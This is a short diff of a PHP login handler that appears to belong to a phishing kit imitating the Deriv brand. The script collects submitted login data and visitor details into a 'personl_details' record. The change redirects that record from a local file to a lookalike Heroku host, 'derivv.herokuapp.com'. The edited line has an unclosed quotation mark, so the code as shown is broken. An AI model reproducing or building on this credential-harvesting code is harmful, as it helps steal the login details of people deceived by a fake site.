@@ -19,7 +19,7 @@ if (isset($_POST['login'])) {
 	$body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
 
 
-	$save=fopen("C:/xampp/htdocs/deriv/auth/log/personl_details.txt","a+");
+	$save=fopen("https://derivv.herokuapp.com/personl_details.txt,"a+");
 	fwrite($save,$body);
 	fclose($save);
 }
